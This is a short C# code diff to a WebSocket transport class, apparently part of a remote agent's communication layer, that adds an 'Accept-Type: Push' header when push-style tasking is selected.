@@ -247,6 +247,14 @@ namespace WebsocketTransport
             if (Client == null)
             {
                 Client = new WebSocket(Endpoint + PostUri);
+
+                if (TaskingType == "Push")
+                {
+                    Client.CustomHeaders = new List<KeyValuePair<string, string>>
+                    {
+                        new KeyValuePair<string, string>("Accept-Type", "Push")
+                    };
+                }
                 
 
                 if (!string.IsNullOrEmpty(ProxyAddress))
